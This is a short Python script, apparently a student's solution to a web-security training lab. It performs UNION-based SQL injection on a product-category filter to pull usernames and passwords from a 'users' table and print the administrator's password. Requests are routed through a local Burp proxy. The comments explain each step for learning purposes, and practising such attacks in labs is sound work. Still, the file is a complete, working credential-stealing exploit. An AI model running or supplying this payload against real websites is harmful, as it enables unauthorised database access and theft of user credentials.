import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#What the proxy's role: its going to send all the requests that the script is making through burb first before it sends it to the application and then any response
##from the application gets sent through burb first before it gets sent back to my script 

proxies = {'http': 'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}


#Our function, its going to be used inside the program
def exploit_sqli_users_table(url):
    username = 'administrator'
    path = '/filter?category=Pets' #Using burbsuit we can get the GET reuest and set it as out path
    sql_payload ="' UNION select NULL, username||'*'||password from users--"
    r = requests.get(url + path + sql_payload, verify=False,proxies=proxies) # settinf verify to false because we dont want to verify TLS Certificate
    res = r.text

    if username in res :
         print("[+] Found the administrator password ...")
         parsed_res =BeautifulSoup(r.text,'html.parser')
         admin_pass = parsed_res.find(string=re.compile('.*administrator.*')).split('*')[1] #extract the seconde argument which it will be the password because in array it starts from zero
         print("[+] The administrator password is '%s'." % admin_pass)
         return True
    return False


#next we create our main method
# please : we are assuming we already know the number of columns that the vulnreable app is using and you have found the which columns contain text
if __name__ =='__main__':
    try:
        #my script will look like this : script.py <url>, so it will take only 1 argument 
        url = sys.argv[1].strip() # strip()  method to remove any leading or trailing whitespace from the string
         

    except IndexError:
        print("[-] USAGE : %s <url> " % sys.argv[0]) #sys.argv[0] is the name of the script itself.
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("[+] Finding the list of usernames and passwords...")
    
    if not exploit_sqli_users_table(url):
            print("[-] Didnt find any administrator password")
    

